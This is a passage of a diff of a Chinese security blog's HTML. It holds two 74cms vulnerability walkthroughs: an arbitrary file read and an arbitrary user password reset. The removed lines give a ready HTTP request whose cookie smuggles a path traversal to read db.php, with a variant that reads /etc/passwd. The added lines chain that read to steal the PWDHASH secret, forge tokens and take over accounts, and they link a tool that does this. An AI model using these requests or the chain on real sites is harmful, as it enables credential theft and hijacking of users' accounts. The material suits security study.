href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%820x01">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。0x01</a> 74cms升级到最新版1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>突突突突突突突文件：74cms\upload\Application\Home\Controller\ApiController.class.php方法：members_edit(</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId23.png"></p>
-<p>从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。那么就让我们直接利用试试。</p>
-<p>先看看数据库现在的数据</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<p>接着让我们来调接口看看</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p>文件：<br>74cms\upload\Application\Home\Controller\ApiController.class.php方法：check_token(</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<p>接口调用失败的原因是因为，上图的析构函数调用了方法 check_token 进行了token验证</p>
-<p>这些都没有问题，$token 也是我们可以操控的。</p>
-<p>现在的问题就是C(&#39;PWDHASH&#39;) 我们现在无法得到。</p>
-<p>好在，我们还可以通过组合漏洞的形式来获取。</p>
-<p>想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C(&#39;PWDHASH&#39;)<br>的值读取出来，然后在加密验证一下即可</p>
-<p>而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。</p>
-<p>思路：先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数）然后在通过 “任意文件读取漏洞” 读取目标站点的C(&#39;PWDHASH&#39;)<br>的值，接着本地加密成token这样漏洞就可以使用了</p>
-<p>任意文件读取的小脚本下载</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
-<p>下载此文件以后</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
-<p>设置成这样，然后执行一下</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
-<p>接着把 PWDHASH 复制出来</p>
-<p>我们这里看看加密的代码：文件：74cms\upload\Application\Common\Common\function.php函数：encrypt(</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<p>然后加密一下</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
-<p>这时你就会发现虽然我们密码改了但是不知道用户名怎么办？</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
-<p>好在我们可以这样利用！人家登录是可以用户名，手机号登录的，所以我们就</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
-<p>当然如果你要修改用户名登录的话，也可以，看你自己喜欢了</p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
-<h2 id="0x03-利用小工具"><a href="#0x03-利用小工具" class="headerlink" title="0x03 利用小工具"></a>0x03 利用小工具</h2><p>为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。利用工具:</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/rymscc">https://www.yuque.com/pmiaowu/bfgkkh/rymscc</a></p>
 </blockquote>
 
       
@@ -1055,7 +935,7 @@ Upgrade-Insecure-Requests: 1</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1068,7 +948,7 @@ Upgrade-Insecure-Requests: 1</code></pre>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="post-title-link" itemprop="url">74cms v4.2.3任意文件读取</a>
+          <a href="/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1080,7 +960,7 @@ Upgrade-Insecure-Requests: 1</code></pre>
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:01" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:04:06" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1103,39 +983,52 @@ Upgrade-Insecure-Requests: 1</code></pre>
     
     <div class="post-body" itemprop="articleBody">
           <a id="more"></a>
-<h1 id="74cms-v4-2-3任意文件读取"><a href="#74cms-v4-2-3任意文件读取" class="headerlink" title="74cms v4.2.3任意文件读取"></a>74cms v4.2.3任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v4.2.3</p>
-<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先尝试读取 db.php，向服务器post如下数据</p>
-<pre><code>POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1
-Host: www.0-sec.org
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: keep-alive
-Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
-Content-Type: application/x-www-form-urlencoded
-
-ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</code></pre>
-<p>会返回如下数据</p>
-<p>1.png</p>
-<p>在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p>
-<p>2.png</p>
-<p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp<br>Suite上返回的时间转换为时间戳</p>
-<p>3.png</p>
-<p>不过这个时间可能会有误差，如果不行就把时间+-10</p>
-<p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p>
-<p>4.png</p>
-<p>成功获取图片名，然后访问</p>
-<pre><code>https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg </code></pre>
-<p>保存该图片用文本打开就是 db.php 的内容。</p>
-<h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>使用post提交，参数如下</p>
-<p>5.png</p>
-<p>在Header可获取到时间戳</p>
-<p>6.png</p>
-<h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p>
-<h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p>
-<p>是读取db.php，如果想读取根目录可以构造</p>
-<p>../../../../../../../../etc/passwd</p>
-<h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>
+<h1 id="74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞"><a href="#74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞" class="headerlink" title="74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞"></a>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%820x01">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。0x01</a> 74cms升级到最新版1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>突突突突突突突文件：74cms\upload\Application\Home\Controller\ApiController.class.php方法：members_edit(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId23.png"></p>
+<p>从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。那么就让我们直接利用试试。</p>
+<p>先看看数据库现在的数据</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>接着让我们来调接口看看</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>文件：<br>74cms\upload\Application\Home\Controller\ApiController.class.php方法：check_token(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p>接口调用失败的原因是因为，上图的析构函数调用了方法 check_token 进行了token验证</p>
+<p>这些都没有问题，$token 也是我们可以操控的。</p>
+<p>现在的问题就是C(&#39;PWDHASH&#39;) 我们现在无法得到。</p>
+<p>好在，我们还可以通过组合漏洞的形式来获取。</p>
+<p>想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C(&#39;PWDHASH&#39;)<br>的值读取出来，然后在加密验证一下即可</p>
+<p>而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。</p>
+<p>思路：先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数）然后在通过 “任意文件读取漏洞” 读取目标站点的C(&#39;PWDHASH&#39;)<br>的值，接着本地加密成token这样漏洞就可以使用了</p>
+<p>任意文件读取的小脚本下载</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
+<p>下载此文件以后</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>设置成这样，然后执行一下</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>接着把 PWDHASH 复制出来</p>
+<p>我们这里看看加密的代码：文件：74cms\upload\Application\Common\Common\function.php函数：encrypt(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>然后加密一下</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<p>这时你就会发现虽然我们密码改了但是不知道用户名怎么办？</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
+<p>好在我们可以这样利用！人家登录是可以用户名，手机号登录的，所以我们就</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<p>当然如果你要修改用户名登录的话，也可以，看你自己喜欢了</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
+<h2 id="0x03-利用小工具"><a href="#0x03-利用小工具" class="headerlink" title="0x03 利用小工具"></a>0x03 利用小工具</h2><p>为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。利用工具:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
